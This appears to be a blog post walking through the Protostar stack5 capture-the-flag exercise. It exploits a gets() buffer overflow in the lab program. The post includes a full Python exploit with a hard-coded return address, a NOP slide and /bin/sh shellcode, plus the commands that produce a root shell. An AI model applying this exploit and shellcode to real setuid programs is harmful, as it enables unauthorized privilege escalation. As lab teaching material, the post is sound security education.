---
layout: post
title: "Using shellcode: protostar stack5"
date: 2019-1-2
categories: jekyll update
---
For this challenge, there is no function that we will call. Rather, our goal now is to get root

{% highlight c %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
{% endhighlight %}

What we are given to work with here is simply a main function with a buffer of size 64 and a gets() function.

We can use python to test how many characters we need to input to trigger a crash. Because the buffer is the same size, I will try to use 76 "A"s, like before.

$ python -c 'print "A"*76' \| /opt/protostar/bin/stack5

$

If we run the program with 75 characters, it doesn't cause a crash. Therefore we can use 76 as our padding.

Besides being able to crash the program, it doesn't seem there is much in the program that we can exploit. This is where shellcode comes into play, being that we are able to inject our own machine instructions.

While writing your own shellcode is a very good skill to learn, for the sake of simplicity it may be a better idea to use someone else's. This way, there is no need to worry about if any errors come from the shellcode, or the exploit, there is only one variable: the exploit.

I grabbed some shellcode from shell-storm.org/shellcode. There's a lot of different shellcode, but I just used a simple /bin/sh one.

Essentially what we do now is begin constructing our exploit. I used python 2.7.

{% highlight python %}
offset = "A"*76

#address into the nop slide
eip = "\xe0\xf7\xff\xbf"

nop = "\x90"

#shellcode to call /bin/sh
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

print offset + eip + (nop * 78) + shellcode
{% endhighlight %}

What the exploit is doing is printing a sting. First we fill the buffer to let us overflow. Then the EIP is overwritten with an address I guessed would land us in the shellcode. This is followed by a somewhat large number of NOPs. NOPs are machine instructions which do nothing, so they are perfect for creating a "slide" into the shellcode. If the EIP which I guessed is anywhere in the memory with the NOPs, the processor will execute the do nothing instruction all the way until it reaches our shellcode, and executes that.

$ python exploit.py \| /opt/protostar/bin/stack5

$

This is strange, it doesn't seem to give any kind of a segfault, so what is going on here? It should either crash or give a shell. 

Our problem has to do with the way i/o is handled, and so we end up executing the program, but don't interact with it.

We need some way to interact with the shell, so we can use the cat command with a dash (-) after the file to cat.
This will allow us to interact with our shell

$ python exploit.py > e

$ cat e - \| /opt/protostar/bin/stack5

whoami

root


Our exploit works!
